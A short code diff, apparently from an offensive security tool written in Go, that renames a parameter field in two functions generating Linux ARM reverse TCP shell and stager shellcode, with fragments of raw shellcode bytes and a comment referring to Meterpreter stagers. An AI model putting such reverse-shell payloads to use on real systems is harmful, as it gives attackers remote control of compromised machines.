@@ -15,7 +15,7 @@ func reverse_tcp_shell_linux_arm_32(params api.Parameters) ([]byte, error) {
 	port := params.Port
 	entry := params.Entry
 	shellcode_vaddr := uint32(0x0)
-	ip := params.Ip
+	ip := params.IP
 
 	shellcode1 := "\x00\x40\xa0\xe1" // mov r4, r0
 	shellcode1 += "\x00\x00\x40\xe0" // sub r0, r0, r0
@@ -71,7 +71,7 @@ func reverse_tcp_stager_linux_arm_32(params api.Parameters) ([]byte, error) {
 	port := params.Port
 	entry := params.Entry
 	shellcode_vaddr := uint32(0x0)
-	ip := params.Ip
+	ip := params.IP
 
 	/*
 	   FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
